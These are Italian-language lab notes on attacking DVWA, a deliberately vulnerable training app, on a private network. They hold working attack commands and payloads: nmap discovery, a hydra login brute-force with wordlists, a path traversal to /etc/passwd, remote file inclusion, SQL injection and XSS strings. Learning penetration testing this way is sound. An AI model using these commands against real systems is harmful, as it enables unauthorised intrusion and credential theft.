> Lavoro sulla repo "pentestlab"

# Strumenti utilizzati
- **Burp**: Il classico funzionamento di Burp è quello di frapporsi
tra il broswer e il server dell’applicativo web con il
proprio http proxy.

# Attacco bruteforce
1. Discovery dell'host vulnerabile```nmap -sn 192.168.56.0/24```

2. Primo attacco di **bruteforce** al login aprendo ```Burp > Proxy > Intercept On > Open on browser ```.

3. Appena trovo la richiesta giusta la invio al ```repeater```

4. Creo la richiesta hydra (non funziona)

```
hydra 172.8.0.1 -L SecLists/Usernames/top-usernames-shortlist.txt \
-P SecLists/Passwords/xato-net-10-million-passwords-100.txt \
http-get-form \ 
"/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=INSERIRE"

```
 5. (Opzionale) generare pw da un sito: ```cewl -d 1 -m 5 https://ulisse.unibo.it```

# Attacco File Inclusion
1. Ottengo una risorsa
```
http://dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd"
```
2. Creo una risorsa
```
touch text.php
python3 -m http.server 8081

# posso mettere http://.../text.php come page 
```

# Attacco SQL Injection
## Blind
 ``` ' OR '1' = '1 ```

## Union based
Il meccanismo UNION permette di combinare i risultati di due SELECT in un’unica risposta HTTP.

Per avere successo, entrambe le query devono restituire lo stesso numero di colonne con tipi compatibili
1. **Count columns**: usa payload come UNION SELECT NULL,NULL,...-- incrementando i NULL finché non sparisce l’errore di mismatch

2. **Test data types**: sostituisci NULL con valori di test ('a', 1) per identificare colonne stringa vs numeriche.

3. **Extract data**: una volta allineate le colonne, seleziona campi sensibili (es. username,password) dalla tabella desiderata

 ```' UNION SELECT NULL,NULL-- ```

# XSS
## Semplice
Se metto nel payload ```\<script>alert("[TESTO]")</script>``` scaricando il dato, esegue lo script

## Utilizzo di Burp
proxy -> open in browser: Avvio l'interceptor delle richieste e intercetta una richiesta http.

Mi accorgo che nell'ultima riga c'è il body della richiesta mandato con POST.

Se vado nel tab **DECODE** posso codificare o decodificare
